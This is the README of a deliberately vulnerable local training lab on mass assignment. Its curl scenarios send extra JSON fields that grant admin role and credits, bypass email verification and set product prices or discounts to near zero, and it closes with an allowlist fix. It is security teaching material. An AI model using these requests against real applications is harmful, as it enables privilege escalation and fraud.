# Lab 14 — Mass Assignment 🔴

**Port:** `8014` | **Stack:** Node.js + MySQL | **Swagger:** `http://localhost:8014/api-docs`  
**Difficulty:** Beginner–Intermediate

---

## 🕳️ Security Loopholes

1. **`req.body` Spread Directly Into SQL** — All user-supplied fields accepted without an allowlist
2. **Swagger Reveals Hidden Fields** — `role`, `credits`, `is_verified` documented as "internal use only" but still accepted
3. **Profile Update Allows Role Escalation** — `PUT /profile` accepts any field including `role`
4. **Product Discount Manipulation** — `PUT /products/:id` lets any user set `discount_pct=100`

---

## 🎯 Attack Scenarios

### Scenario A — Register as Admin
```bash
docker compose up -d

# Check Swagger first to find "internal" fields
curl http://localhost:8014/api-docs.json | python3 -m json.tool

# Register with elevated privileges
curl -X POST http://localhost:8014/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "email": "hacker@evil.com",
    "password": "hacked",
    "role": "admin",
    "credits": 999999,
    "is_verified": 1,
    "is_banned": 0
  }'

# Verify — you're now admin with 999999 credits
curl http://localhost:8014/me -H "X-User-Id: 4"
```

### Scenario B — Privilege Escalation via Profile Update
```bash
# Escalate Bob (user 3) to admin
curl -X PUT http://localhost:8014/profile \
  -H "Content-Type: application/json" \
  -H "X-User-Id: 3" \
  -d '{"role": "admin", "credits": 1000000, "is_verified": 1}'

curl http://localhost:8014/me -H "X-User-Id: 3"
```

### Scenario C — Product Price Manipulation
```bash
# Set Laptop discount to 100% (free!)
curl -X PUT http://localhost:8014/products/1 \
  -H "Content-Type: application/json" \
  -H "X-User-Id: 2" \
  -d '{"discount_pct": 100}'

# Or directly change the price
curl -X PUT http://localhost:8014/products/1 \
  -H "Content-Type: application/json" \
  -H "X-User-Id: 2" \
  -d '{"price": 0.01, "discount_pct": 99}'

curl http://localhost:8014/products
```

### Scenario D — Bypass Email Verification
```bash
# Alice (user 2) is not verified — verify herself
curl -X PUT http://localhost:8014/profile \
  -H "Content-Type: application/json" \
  -H "X-User-Id: 2" \
  -d '{"is_verified": 1}'
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| Burp Suite | Add extra fields to any request body |
| `curl` | Manual field injection |
| `postman` | Import Swagger spec, add hidden fields to requests |
| `arjun` | Discover hidden parameters: `arjun -u http://localhost:8014/register -m POST` |

---

## 🔐 How to Fix

```javascript
// ALWAYS use explicit allowlists — never spread req.body
app.post('/register', async (req, res) => {
  // Only these fields are accepted — nothing else
  const { username, email, password } = req.body;

  // Explicitly set sensitive defaults — never from user input
  await db.query(
    'INSERT INTO users (username, email, password, role, is_verified, credits) VALUES (?,?,?,?,?,?)',
    [username, email, hashedPassword, 'user', 0, 0]
  );
});

app.put('/profile', auth, async (req, res) => {
  // Allowlist only safe-to-update fields
  const allowed = ['email', 'display_name', 'bio'];
  const updates = Object.fromEntries(
    Object.entries(req.body).filter(([k]) => allowed.includes(k))
  );
  // ...
});
```
